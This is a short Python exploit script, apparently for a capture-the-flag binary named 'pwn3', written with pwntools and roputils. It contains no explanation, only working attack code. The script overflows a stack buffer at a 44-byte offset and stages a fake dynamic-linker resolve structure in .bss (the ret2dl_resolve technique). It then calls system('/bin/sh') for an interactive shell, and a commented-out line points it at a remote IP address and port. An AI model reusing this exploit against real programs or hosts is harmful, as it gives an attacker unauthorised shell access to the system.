# Fake stack that resolving function.
import sys
sys.path.insert(1, './tools/roputils')
import roputils
from pwn import *

p = process('./pwn3')
#p = remote('203.162.91.5', 6969)
rop = roputils.ROP('./pwn3')
bss = rop.section('.bss')
log.info("BSS: " + hex(bss))
read = rop.plt('read')
my_func = rop.addr('vuln')
offset = 44


# write resolve struct
buf1 = 'A' * offset #44
buf1 += p32(read) + p32(my_func) + p32(0) + p32(bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(bss+20, 'system')
buf2 += rop.fill(100, buf2)
p.send(buf2)

# get system & system('/bin/sh')
buf3 = 'A'*offset + rop.dl_resolve_call(bss+20, bss)
p.send(buf3)
p.interactive()
